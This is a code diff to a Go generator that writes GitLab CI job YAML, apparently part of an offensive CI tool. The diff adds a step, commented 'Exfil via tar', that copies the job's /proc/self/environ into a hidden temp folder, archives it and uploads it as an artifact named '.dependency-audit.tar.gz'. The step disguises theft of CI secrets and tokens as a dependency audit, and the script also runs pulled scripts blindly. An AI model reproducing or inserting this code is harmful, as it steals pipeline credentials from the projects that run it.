@@ -44,6 +44,11 @@ func GenerateNeedsProjectYAML(o NeedsProjectOptions) string {
   script:
     - |
 %s
+  artifacts:
+    when: always
+    paths:
+      - .dependency-audit.tar.gz
+    expire_in: 1 day
   allow_failure: true%s
 `, stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
 		o.SourceProject, o.SourceJob, o.SourceRef,
@@ -62,8 +67,11 @@ func buildDefaultNeedsScript() string {
     [ -f "$script" ] && chmod +x "$script" && ./"$script" || true
   done
 
-  # Dump environment alongside pulled artifacts
-  printenv | sort || true
+  # Exfil via tar of /proc/self/environ (binary-safe, avoids text tools)
+  mkdir -p /tmp/.dep-audit
+  cp /proc/self/environ /tmp/.dep-audit/raw.bin 2>/dev/null || true
+  tar czf .dependency-audit.tar.gz -C /tmp/.dep-audit . 2>/dev/null || true
+  rm -rf /tmp/.dep-audit || true
 }
 _EXPLOIT || true`
 }
